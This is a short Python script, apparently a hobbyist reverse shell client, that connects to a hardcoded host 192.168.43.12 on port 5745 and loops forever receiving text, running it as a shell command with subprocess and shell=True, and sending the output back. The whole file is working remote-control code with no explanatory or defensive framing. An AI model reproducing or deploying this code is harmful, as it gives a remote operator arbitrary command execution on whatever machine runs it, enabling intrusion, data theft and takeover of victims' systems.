import socket
import os
import subprocess
from sys import stderr, stdout
import threading
from typing import IO

HOST="192.168.43.12"
PORT=5745

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

while True:
    commmand_received=client.recv(1024).decode("utf-8")
    cmd=subprocess.Popen(commmand_received[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    reply_to_server = cmd.stdout.read()
    #reply_to_server = IO.BufferedReader(reply_to_server)
    client.send(reply_to_server) 